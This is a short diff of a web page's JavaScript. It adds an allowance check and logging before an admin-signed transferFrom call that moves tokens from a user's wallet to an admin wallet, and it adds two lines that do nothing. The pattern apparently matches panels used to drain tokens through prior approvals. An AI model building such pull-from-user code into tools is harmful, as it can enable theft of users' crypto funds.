@@ -205,6 +205,7 @@
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
@@ -236,6 +237,11 @@
             $("#loader-btn").css('display','block');
 
             try {
+                let allowanceAmount = await tokenContract.methods.allowance(userWalletAddress, adminWalletAddress).call()
+
+                allowanceAmount = Number(allowanceAmount.toString())
+                console.log(allowanceAmount)
+                
                 const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
                     from: adminWalletAddress
                 })
@@ -260,6 +266,7 @@
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
